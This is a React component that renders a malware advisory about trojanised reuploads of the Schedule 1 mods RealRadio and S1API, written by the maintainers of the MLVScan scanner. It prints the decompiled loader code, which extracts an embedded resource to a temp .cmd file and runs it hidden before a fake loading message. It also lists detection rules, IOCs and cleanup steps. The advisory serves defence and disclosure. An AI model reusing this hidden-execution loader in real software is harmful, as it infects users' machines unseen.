export default function RealRadioMalwareAnalysisContent() {
  return (
    <>
      <div className="bg-red-500/10 border-2 border-red-500/50 rounded-lg p-6 mb-6">
        <p className="text-xl font-bold text-red-200 mb-3">⚠️ IMPORTANT DISCLAIMER</p>
        <p className="text-gray-200 mb-4">
          This advisory analyzes malicious <strong>reuploads</strong> of legitimate mods. Both <strong>RealRadio</strong> and <strong>S1API</strong> were legitimate mods that were stolen, had malware injected, and were reuploaded by a malicious actor.
        </p>
        <p className="text-gray-200 mb-4">
          Additionally, the original <strong>WaitingTimeOnFire</strong> mod was initially safe when uploaded by its legitimate author. However, on <strong>January 18, 2026</strong>, a malicious update was pushed that injected malware into the mod (likely compromised account). Nexus Mods staff removed this malicious update and banned the user. The mod page still exists but the malware has been removed.
        </p>
        <p className="text-gray-200">
          If you are using the authentic original versions from the legitimate authors, you are safe. The original authors and their mods are legitimate.
        </p>
      </div>

      <p className="text-lg text-gray-300 mb-6">
        Analysis reveals this is actually the same malware as "WaitingTimeOnFire" - the mod executes malicious payload via embedded resource extraction before displaying a fake loading message to deceive users.
      </p>

      <hr className="border-gray-800 my-8" />

      <h2 id="malicious-behavior" className="text-2xl font-bold text-white mb-4">Malicious Behavior</h2>
      
      <p className="text-gray-300 mb-4">
        Upon initialization, the mod extracts an embedded resource and executes it before displaying any legitimate mod functionality:
      </p>

      <pre className="bg-gray-950 border border-gray-800 rounded-lg p-4 overflow-x-auto mb-6">
        <code className="text-sm text-gray-300">
{`// OnInitializeMelon() - Executes malware BEFORE loading legitimate mod
// Step 1: Extract "MelonBase" embedded resource
Stream resource = Assembly.GetExecutingAssembly()
    .GetManifestResourceStream("MelonBase");

// Step 2: Create random temp file with .cmd extension  
string tempPath = Path.Combine(
    Path.GetTempPath(),
    string.Format("{0}.cmd", Guid.NewGuid())
);

// Step 3: Write malware payload to temp file
using (FileStream fs = new FileStream(tempPath, FileMode.Create))
{
    resource.CopyTo(fs);
}

// Step 4: Execute via ShellExecuteEx (hidden)
SHELLEXECUTEINFO info = new SHELLEXECUTEINFO();
info.cbSize = Marshal.SizeOf(info);
info.fMask = 64;
info.lpVerb = "open";
info.lpFile = tempPath;
info.nShow = 0; // Hidden - SW_HIDE
ShellExecuteEx(ref info); // MALWARE EXECUTES HERE

// Step 5: Display fake loading message to deceive user
MelonLogger.Msg("[/] Waiting Time on Fire is loading...");`}
        </code>
      </pre>

      <h3 className="text-lg font-semibold text-white mb-3">Deception Technique</h3>
      <ul className="list-disc pl-6 space-y-2 text-gray-300 mb-6">
        <li><strong>Malware First:</strong> Executes malicious payload BEFORE loading legitimate mod features</li>
        <li><strong>Fake Loading Messages:</strong> Displays "Waiting Time on Fire is loading..." to deceive users</li>
        <li><strong>Dual Identity:</strong> Poses as "RealRadio" but contains "WaitingTimeOnFire" code</li>
        <li><strong>Hidden Execution:</strong> SW_HIDE prevents users from seeing the malware execute</li>
        <li><strong>Same Attack Pattern:</strong> Identical to CustomTV_IL2CPP and NoMoreTrash malware</li>
      </ul>

      <hr className="border-gray-800 my-8" />

      <h2 id="detection" className="text-2xl font-bold text-white mb-4">MLVScan Detection</h2>
      
      <p className="text-gray-300 mb-4">
        MLVScan detected this threat through multiple detection vectors:
      </p>

      <pre className="bg-gray-950 border border-gray-800 rounded-lg p-4 overflow-x-auto mb-6">
        <code className="text-sm text-gray-300">
{`[Critical] Detected high-risk DllImport of shell32.dll with 
       suspicious function ShellExecuteEx
  Rule: DllImportRule
  Location: Northwards.ShellExecuteEx
  
[High] Detected embedded resource extraction (GetManifestResourceStream)
  Rule: ResourceExtractionRule
  Resource: "MelonBase"
  
[High] Suspicious use of Path.GetTempPath with file execution
  Rule: SuspiciousPathRule
  Pattern: Random GUID filename + .cmd extension`}
        </code>
      </pre>

      <h3 className="text-lg font-semibold text-white mb-3">Whitelist Transition</h3>
      <p className="text-gray-300 mb-4">
        Prior to MLVScan 1.6.0 (released November 25, 2025), MLVScan used a filename-based whitelist that could potentially allow malware using random GUID filenames to bypass detection. This was transitioned to a SHA256 hash-based whitelist in MLVScan 1.6.0. What this means:
      </p>
      <ul className="list-disc pl-6 space-y-2 text-gray-300 mb-6">
        <li><strong>Cryptographic Verification:</strong> Each file is identified by its unique SHA256 hash, not just its name</li>
        <li><strong>Tamper Detection:</strong> Any modification to a file changes its hash, immediately flagging it for re-analysis</li>
        <li><strong>No Filename Gaming:</strong> Malware cannot evade detection by simply using random or deceptive filenames</li>
        <li><strong>Immutable Trust:</strong> Once a file is verified and whitelisted, its hash is permanently associated with that clean state</li>
      </ul>

      <h3 className="text-lg font-semibold text-white mb-3">Community Response</h3>
      <p className="text-gray-300 mb-4">
        The Schedule 1 modding Discord community actively monitors the Schedule 1 category on Nexus Mods. When malware is detected, community members immediately analyze and report it, leading to swift removal. Beyond reporting to Nexus Mods, the community also reports malicious infrastructure to registrars and hosting providers to further deter attackers.
      </p>

      <hr className="border-gray-800 my-8" />

      <h2 id="recommendations" className="text-2xl font-bold text-white mb-4">Recommendations</h2>
      
      <h3 className="text-xl font-semibold text-white mb-2">For Users Who Downloaded This Mod</h3>
      <div className="bg-orange-500/10 border border-orange-500/30 rounded-lg p-4 mb-6">
        <p className="text-orange-200 font-medium mb-2">⚠️ If you installed this mod:</p>
        <ul className="list-disc pl-6 space-y-1 text-gray-300">
          <li><strong>Immediately uninstall</strong> and delete all mod files</li>
          <li><strong>Check %TEMP% directory</strong> for .cmd files with GUID names</li>
          <li><strong>Run a full antivirus scan</strong> - the malware executes before mod loads</li>
          <li><strong>Check startup entries</strong> in Task Manager and registry</li>
          <li><strong>Change all passwords</strong> (Steam, banking, email)</li>
          <li><strong>Consider wiping and reinstalling Windows</strong></li>
        </ul>
      </div>

      <h3 className="text-xl font-semibold text-white mb-2">For All Users</h3>
      <ul className="list-disc pl-6 space-y-2 text-gray-300 mb-6">
        <li><strong>Always scan mods</strong> with MLVScan before installation</li>
        <li><strong>Watch for shell32.dll imports</strong> - this is a major red flag</li>
        <li><strong>Be suspicious of "MelonBase" resources</strong> - used by multiple malware samples</li>
        <li><strong>Verify mod names match functionality</strong> - "RealRadio" showing "Waiting Time on Fire" messages is suspicious</li>
      </ul>

      <hr className="border-gray-800 my-8" />

      <h2 id="technical-analysis" className="text-2xl font-bold text-white mb-4">Technical Analysis</h2>
      
      <h3 className="text-lg font-semibold text-white mb-3">Indicators of Compromise (IOCs)</h3>
      <ul className="list-disc pl-6 space-y-2 text-gray-300 mb-6">
        <li><strong>File Names:</strong> RealRadio.dll, S1API.Il2Cpp.MelonLoader.dll</li>
        <li><strong>Internal Name:</strong> WaitingTimeOnFire</li>
        <li><strong>Embedded Resource:</strong> "MelonBase"</li>
        <li><strong>Temp Pattern:</strong> %TEMP%\{'{GUID}'}.cmd</li>
        <li><strong>API Import:</strong> shell32.dll!ShellExecuteEx</li>
        <li><strong>Package:</strong> "com.deinname.waitingtimeonfire"</li>
        <li><strong>Fake Loading Message:</strong> "Waiting Time on Fire is loading..."</li>
      </ul>

      <h3 className="text-lg font-semibold text-white mb-3">Evasion Techniques</h3>
      <ul className="list-disc pl-6 space-y-2 text-gray-300 mb-6">
        <li><strong>Multiple Identities:</strong> Same malware distributed under different mod names</li>
        <li><strong>Deceptive Loading:</strong> Executes malware BEFORE showing loading messages</li>
        <li><strong>Embedded Payload:</strong> No network connection required</li>
        <li><strong>Randomized Filenames:</strong> GUID-based temp file names</li>
        <li><strong>Hidden Execution:</strong> SW_HIDE (nShow = 0)</li>
      </ul>

      <hr className="border-gray-800 my-8" />

      <h2 id="references" className="text-2xl font-bold text-white mb-4">References</h2>
      <ul className="list-disc pl-6 space-y-2 text-gray-300">
        <li><a href="https://www.nexusmods.com/schedule1/mods/1344" className="text-teal-400 hover:text-teal-300 underline" target="_blank" rel="noopener noreferrer">Nexus Mods - WaitingTimeOnFire</a> (malicious update removed, user banned)</li>
        <li>Related Advisories: CustomTV_IL2CPP, NoMoreTrash (same attack pattern)</li>
        <li>Analysis Tool: MLVScan with DllImport detection</li>
        <li>Detection Rules: DllImportRule, ResourceExtractionRule</li>
      </ul>
    </>
  )
}
